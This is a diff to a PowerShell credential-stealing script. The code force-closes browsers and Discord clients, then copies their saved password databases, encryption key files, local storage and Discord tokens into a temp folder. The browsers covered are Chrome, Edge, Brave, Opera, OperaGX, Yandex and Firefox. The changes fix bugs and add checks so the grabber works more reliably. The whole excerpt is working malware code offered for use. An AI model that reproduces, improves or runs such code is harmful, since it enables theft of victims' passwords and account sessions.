@@ -599,48 +599,55 @@ function chromiumBrowser {
 	[Parameter (Position=1,Mandatory = $True)]
 	[string]$Browser
 	)
-
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\User Data\Local State"
 $logindata = "$path\User Data\default\Login Data"
 $preferences = "$path\User Data\default\Preferences"
-$localstorage = "$path\User Data\default\Local Storage\leveldb\"
+$localstorage = "$path\User Data\default\Local Storage\leveldb"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb\"
-
+Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
 }
 
 # Get FireFox Passwords
+$key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if($key4 -ne $null){
 taskkill /IM firefox.exe /F
 sleep 1
 New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
-$key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
 echo $key4 > $env:TMP\$FolderName\Firefox\key4.db
 $logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-echo $key4 > $env:TMP\$FolderName\Firefox\logins.json
+echo $logins > $env:TMP\$FolderName\Firefox\logins.json
+}
 
 # Get Chrome Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Google\Chrome\User Data\Local State")){
 taskkill /IM chrome.exe /F
 sleep 1
-chromiumBrowser -Path "$env:appdata\..\local\Google\Chrome" -Browser "Chrome"
+chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome" -Browser "Chrome"
+}
 
 # Get Edge Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Microsoft\Edge\User Data\Local State")){
 taskkill /IM msedge.exe /F
 sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"
+}
 
 # Get Brave Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\BraveSoftware\Brave-Browser\User Data\Local State")){
 taskkill /IM brave.exe /F
 sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\BraveSoftware\Brave-Browser" -Browser "Brave"
+}
 
 # Get Opera Passwords
+$path="$env:appdata\Opera Software\Opera Stable"
+if([System.IO.File]::Exists("$path\Local State")){
 taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
 sleep 1
-$path="$env:appdata\Opera Software\Opera Stable"
 $Browser="Opera"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
@@ -650,13 +657,15 @@ $leveldb = "$path\Local Storage\leveldb\"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+}
 
 # Get OperaGX Passwords
+$path="$env:appdata\Opera Software\Opera GX Stable"
+if([System.IO.File]::Exists("$path\Local State")){
 taskkill /IM opera.exe /F
 taskkill /IM launcher.exe /F
 sleep 1
-$path="$env:appdata\Opera Software\Opera GX Stable"
 $Browser="OperaGX"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
@@ -666,12 +675,15 @@ $leveldb = "$path\Local Storage\leveldb\"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
+Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
+}
 
 # Get Yandex Passwords
+if([System.IO.File]::Exists("$env:appdata\..\Local\Yandex\YandexBrowser\User Data\Local State")){
 taskkill /IM browser.exe /F
 sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Yandex\YandexBrowser" -Browser "Yandex"
+}
 
 ############################################################################################################################################################
 
@@ -688,14 +700,24 @@ New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
 $localstate = "$path\Local State"
 $localstorage = "$path\Local Storage\leveldb\"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
-Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb\"
+Copy-Item -path $localstorage -Destination "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
 }
 
 # Discord Token Grabbing
 
+
+if([System.IO.File]::Exists("$env:appdata\discord\mute.png")){
+taskkill /IM Discord.exe /F
 discordStorage -Path "$env:appdata\discord" -Browser "Discord"
+}
+if([System.IO.File]::Exists("$env:appdata\discordcanary\mute.png")){
+taskkill /IM DiscordCanary.exe /F
 discordStorage -Path "$env:appdata\discordcanary" -Browser "DiscordCanary"
+}
+if([System.IO.File]::Exists("$env:appdata\discordptb\mute.png")){
+taskkill /IM DiscordPTB.exe /F
 discordStorage -Path "$env:appdata\discordptb" -Browser "DiscordPTB"
+}
 
 ############################################################################################################################################################
 
